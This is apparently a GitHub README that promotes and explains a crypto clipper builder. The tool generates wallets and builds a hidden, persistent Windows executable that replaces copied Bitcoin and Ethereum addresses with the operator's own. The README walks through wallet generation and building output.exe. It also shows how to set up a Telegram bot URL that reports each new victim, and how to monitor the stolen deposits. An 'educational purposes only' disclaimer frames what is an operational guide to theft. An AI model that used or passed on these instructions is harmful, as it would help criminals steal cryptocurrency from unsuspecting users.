# Crypto-Clipper

## About

Crypto Clipper, also known as a **Crypto Stealer** or **Bitcoin Clipper**, is a type of malicious software that poses a significant threat to cryptocurrency users. With the increasing popularity and value of cryptocurrencies like Bitcoin, cybercriminals have developed sophisticated techniques to exploit unsuspecting individuals and steal their digital assets.

A crypto clipper specifically targets cryptocurrency transactions by manipulating the clipboard function on infected devices. When a user copies a cryptocurrency address to the clipboard, the malware intercepts the copied address and replaces it with the attacker's address. As a result, when the user pastes the address into a transaction, the funds are unknowingly redirected to the attacker's wallet instead of the intended recipient.

This form of attack primarily focuses on Bitcoin, the most widely recognized and valuable cryptocurrency. By hijacking the clipboard, the crypto clipper can easily modify Bitcoin addresses, making it difficult for users to detect the fraudulent activity until it's too late. The stolen funds can be virtually untraceable, leaving victims at a significant financial loss.

In addition to being referred to as a **Crypto Stealer** or **BTC Clipper**, this type of malware is also commonly known as a **Bitcoin clipper** or **Bitcoin stealer**. These terms highlight the specific targeting of Bitcoin transactions and the malicious intent behind the software.

It is crucial for cryptocurrency users to be aware of the risks associated with crypto clippers and take proactive measures to protect their digital assets. This includes using reputable antivirus software, regularly updating their devices and applications, and exercising caution when interacting with cryptocurrency addresses. By staying informed and implementing robust security practices, users can minimize the risk of falling victim to crypto hijackers and safeguard their valuable cryptocurrencies.

## Demonstration

![CryptoCurrency Stealer](https://github.com/btc-stealer/crypto-clipper/assets/150532647/ed04c4ea-ec83-4ce5-a7e4-0ea1d07b9338)


## Features

### Fastest CryptoClipper on the internet:

**1) MASS GENERATION OF BITCOIN AND ETHEREUM WALLETS.**

**2) BUILDS A MALWARE THAT REPLACES ANY BITCOIN OR ETHEREUM ADDRESS COPIED TO THE WINDOWS CLIPBOARD WITH ONE OF THE GENERATED ADDRESSES.**

**3) THE FILE IS DESIGNED TO RUN HIDDEN 100% AS A BACKGROUND PROCESS.**

**4) THE MALWARE RUNS AUTOMATICALLY AFTER A SYSTEM RESTART.**

**5)  YOU CAN ADD THE TELEGRAM API TO RECEIVE NOTIFICATIONS WHENEVER NEW VICTIMS EXECUTE MALWARE.**

## Download Bitcoin Clipper for free

## How to use

### 1)  MASS GENERATE BITCOIN AND ETHEREUM WALLETS:

To get started, generate your own Bitcoin and Ethereum addresses along with their private keys.

Generating a large number of addresses is not recommended as more processing power is required when a copy is performed

Generating 1000 addresses therefore recommended:


![img1](https://github.com/btc-stealer/crypto-clipper/assets/150532647/b5ca389e-9189-49bd-8da1-97e6711a4a3a)


Currently, there are three Bitcoin address formats in use:

P2PKH (address starts with the number “1”) Example: 13fkMoW9Eysnj1tsy5pBwtuLXSQFjB4nYB

P2SH (address starts with the number “3”) Example: 34DWSKppFs6M2LLm4yifNudhqoqRvtGD5K

Bech32 (address starts with “bc1”) Example: bc1q096nnx5k4cm4qredeva0748ud4ea08qzp9kpkv

Ethereum addresses are represented as a string of 40 hexadecimal characters (0-9, a-f) and start with "0x". For example: 0x742d35Cc6634C0532925a3b844Bc454e4438f44e

Wallets for Ethereum and all 3 Bitcoin address formats will be generated and can be found in the folder called “Wallets”

![img2](https://github.com/btc-stealer/crypto-clipper/assets/150532647/05ebd643-4b94-4572-b9cd-5002c10bdb8e)




It is recommended that you back up the addresses and private key pairs in this folder. If funds are deposited into one of these wallets, the private key will be required to gain accesses to the funds.

Note: If you don't want to use our wallet generator and prefer to use your own wallet addresses, there is a "config.txt" file in the "tls" folder. Before building the malware, open the config.txt file and replace the default wallet addresses with your own addresses in the same format.



### 2)ADD YOUR TELEGRAM API TO MALWARE (OPTIONAL)

To use Telegram API with the malware, you can add your Telegram API credentials to the config.txt file. This will enable the malware to send a message to your Telegram bot whenever a new user runs the program. However, adding the Telegram API is optional and not necessary for the malware to function.

To create your api, on your Telegram application (either on your mobile or desktop), search for the BotFather account (make sure to use the verified one):


![img9](https://github.com/btc-stealer/crypto-clipper/assets/150532647/f1a4195d-40dc-4a5b-a4c0-a041202c456a)



Next, follow these steps:
Click the Start button on the bottom of the screen.
Type /newbot and click Enter
Then choose a name for the bot.

![img10](https://github.com/btc-stealer/crypto-clipper/assets/150532647/d1f01161-3f94-4161-a4ee-9292abf945f5)


And, finally, pick a user name (note this must be unique).

![img11](https://github.com/btc-stealer/crypto-clipper/assets/150532647/929c055a-0a2f-4349-8e41-acd1d0e1a2f1)


Then you need to get your unique Telegram id. Start this bot:

https://t.me/raw_data_bot

It will give you, your unique id.

![img12](https://github.com/btc-stealer/crypto-clipper/assets/150532647/ff77db37-6811-4719-bb62-f9d4ab8b64e6)

Start the bot that you created with BotFather.


You need to create a URL with the following format


https://api.telegram.org/bot[BOT_API_TOKEN]/sendMessage?chat_id=[YOUR_ID]


·  Replace [BOT_API_TOKEN] with the token generated by BotFather when you created your bot.

·  Replace [YOUR_ID] with your unique ID.


Finally, open the TLS folder and then open config.txt. Add your URL after the wallet addresses. (You must add your URL after generating your wallets and before building the malware.)

![img13](https://github.com/btc-stealer/crypto-clipper/assets/150532647/f2348d50-c601-4013-95f6-781d0d591e0e)

Then build the malware. As soon as a new user runs the malware, it will send you a message saying, "User <user's unique ID> ran the malware."


### 3)BUILD THE CRYPTO CLIPPER STANDALONE EXECUTABLE FILE

- Your generated Bitcoin and Ethereum addresses will be hard-coded into a new executable file called output.exe.

- The malware is self-contained and does not require any external dependencies to run, making it easy to distribute and execute.

- Even if the victim attempts to remove the malware or restart their system, the malware is designed to persist and continue running.

- Test the malware on a virtual machine.


![img4](https://github.com/btc-stealer/crypto-clipper/assets/150532647/7140a266-4b04-4855-9c40-4e354be08ad6)



### 4)MONITOR YOUR WALLETS

To check the balance of your Bitcoin addresses, I highly recommend using Electrum wallet. However, you are free to use any wallet of your choice. If you have a cryptocurrency wallet that supports multiple addresses, you can import all of your addresses and check their balances in one place. For example, the Exodus wallet supports both Bitcoin and Ethereum, and allows you to import multiple addresses.

To use Electrum:

#### 1_ Download Electrum from their website: https://electrum.org/#download

#### 2_ Install and open the program

#### 3_ Create a new wallet

#### 4_ Select Import Bitcoin addresses or private keys

![img5](https://github.com/btc-stealer/crypto-clipper/assets/150532647/1d2125d4-7e14-4826-93ac-2a9ad449b8dc)

#### 5_ Import all of your Bitcoin addresses into the field:


![Img6](https://github.com/btc-stealer/crypto-clipper/assets/150532647/eb08da1d-90b4-4805-8609-22ccfc5f6278)


##### 6_ Add a password for your wallet or leave it blank and click “Next.”

##### 7_ There you go! You have created a watchlist that will check the balance of all the addresses frequently. Once one of your Bitcoin addresses receives a deposit, you can import the private key of that particular address.

![img7](https://github.com/btc-stealer/crypto-clipper/assets/150532647/791c958a-b749-43d9-9573-dfb2e9c14778)

To check your Ethereum addresses you can use:

https://cointool.app/batchCheckBalance/eth

![img8](https://github.com/btc-stealer/crypto-clipper/assets/150532647/902f28d3-e203-447a-8a65-9d0f884d1892)

## Disclaimer:

The **Crypto Clipper software** provided herein is intended for educational purposes only. It is vital to understand that using or distributing this software for any illegal or malicious activities is strictly prohibited. The developer shall not be held responsible for any misuse, damage, or loss caused by the use of this software.
